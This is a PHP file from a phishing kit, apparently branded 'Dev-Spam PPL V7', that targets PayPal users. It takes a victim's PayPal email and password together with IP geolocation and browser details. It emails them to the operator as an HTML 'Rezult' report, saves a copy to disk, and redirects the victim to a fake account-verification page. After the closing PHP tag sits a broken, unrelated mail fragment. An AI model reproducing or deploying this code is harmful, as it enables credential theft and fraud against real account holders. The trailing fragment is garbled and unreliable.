<?php
/*
///////////////////////////////////////////////////////////////
//            _    _  _ ______   __      ___ __      __      //
//      /\   | |  | || |____  |  \ \    / / |\ \    / /      //
//     /  \  | | _| || |_  / /____\ \  / /| |_\ \  / /       //
//    / /\ \ | |/ /__   _|/ /______\ \/ / | '_ \ \/ /        // 
//   / ____ \|   <   | | / /        \  /  | |_) \  /         // 
//  /_/    \_\_|\_\  |_|/_/          \/   |_.__/ \/          // 
//                   _     Dev-Spam     _                    //
//                        #PPL V7                            //
///////////////////////////////////////////////////////////////  	
*/                                                     

session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');

$DST_MESSAGE .= "
     
		<head>
        <title>DST Rezult</title>
        <style type='text/css'>
            div{
                width:800px;
                background-color: rgb(36,46,60);
                border:3px solid rgb(127,187,25);
                margin:0 auto 8px ;
                padding:0;
                border-radius:10px;
                font-family: Candara ,HelveticaNeue,'Helvetica Neue',Helvetica,Arial;
            }
            img{
                padding-left: 8px;
            }
            td{
              color: white;
            }
        </style>
    </head>
    <body>
    <div >
            <span style='display:block;border-bottom:2px solid rgb(127,187,25); padding: 8px 20px;color: LightGray;'>
                <table width='100%'>
                    <tr>
                        <td><h5 style='margin:0;color: LightGray;'>New Login <span style='color: rgb(127,187,25);'></span> From [<span style='color: rgb(127,187,25);'>".$_SESSION['_LOOKUP_COUNTRY_']."</span>]</h5></td>
                        <td align='right'><span style='font-size:12px;font-family: Verdana;'>".$TIME_DATE."</span></td>
                    </tr>
                </table>
            </span>
            <span style='display:block;padding: 7px 25px;'>
              <table style='font-size:14px;color:#444;margin-bottom:5px; border-collapse:collapse; padding-left:10px; padding-right:10px; padding-top:5px; padding-bottom:5px' border='1' bordercolorlight='#808080' bordercolordark='#808080'>
                <tr>
                  <td colspan='3'>
					<p align='center'><b><font color='#009900'>LOGIN INFORMATION</font></b></td>
                </tr>                
 <tr>
                  <td>PP Email</td>
                  <td>:</td>
                  <td style='color: rgb(127,187,25);'>".$_SESSION['_login_email_']."</td>
                </tr>
                <tr>
                  <td>PP Password</td>
                  <td>:</td>
                  <td style='color: rgb(127,187,25);'>".$_SESSION['_login_password_']."</td>
                </tr>
                <tr>
                  <td colspan='3'>
					<p align='center'><b><font color='#009900'>IP LOOKUP INFORMATION</font></b></td>
                </tr>
                
                <tr>
                  <td><span>City</span></td>
                  <td>:</td>
                  <td style='color: rgb(127,187,25);'>".$_SESSION['_LOOKUP_CITY_']."</td>
                </tr>
                <tr>
                  <td><span>State</span></td>
                  <td>:</td>
                  <td style='color: rgb(127,187,25);'>".$_SESSION['_LOOKUP_REGIONS_']."</td>
                </tr>
                <tr>
                  <td><span>Zip Code</span></td>
                  <td>:</td>
                  <td style='color: rgb(127,187,25);'>".$_SESSION['_LOOKUP_ZIPCODE_']."</td>
                </tr>
                <tr>
                  <td colspan='3'>
					<p align='center'><b><font color='#009900'>VICTIME INFORMATION</font></b></td>
                </tr>
                <tr>
                  <td><span>IP Info</span></td>
                  <td>:</td>
                  <td style='color: rgb(127,187,25);'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</td>
                </tr>
                                <tr>
                  <td><span>Browser</span></td>
                  <td>:</td>
                  <td style='color: rgb(127,187,25);'>".DST1_Browser($_SERVER['HTTP_USER_AGENT'])." On ".DST1_OS($_SERVER['HTTP_USER_AGENT'])."</td>
                </tr>
            </table>
        </span>
		        </span>
				<hr color='#7fbb19'>
            <span style='display:block;border-bottom:2px solid rgb(127,187,25); padding: 8px 20px;color: LightGray;'>
                <table width='100%'>
                    <tr>
                        <td><h5 style='margin:0;color: LightGray;'><span style='color: rgb(127,187,25);'>
						By DevSpam</span></h5></td>
                        <td align='right'><span style='font-size:12px;font-family: Verdana;'></span></td>
                    </tr>
                </table>
            </span>
    </div>
</body>
\n";

        $DST_SUBJECT = "NEW LOGIN [".$_POST['login_email']."] FROM [".$_SESSION['_forlogin_']."]";
        $DST_HEADERS .= "From:DST_V7 <noreply@r00t.dst>";
        $DST_HEADERS .= $_POST['eMailAdd']."\n";
        $DST_HEADERS .= "MIME-Version: 1.0\n";
        $DST_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
       
        @mail($DST_EMAIL, $DST_SUBJECT, $DST_MESSAGE, $DST_HEADERS);
		if($rzhtm == "on"){
$fl = fopen("../../../../Rezult/Gift-".$_SESSION['_login_email_']."--".$_SESSION['_ip_'].".html","a");
fwrite($fl,$DST_MESSAGE);
}

		HEADER("Location: ../settings/?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>
$Z119_Mail = "";
            if (strlen($Z119_Mail) {
 
        @mail($Z119_Mail, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);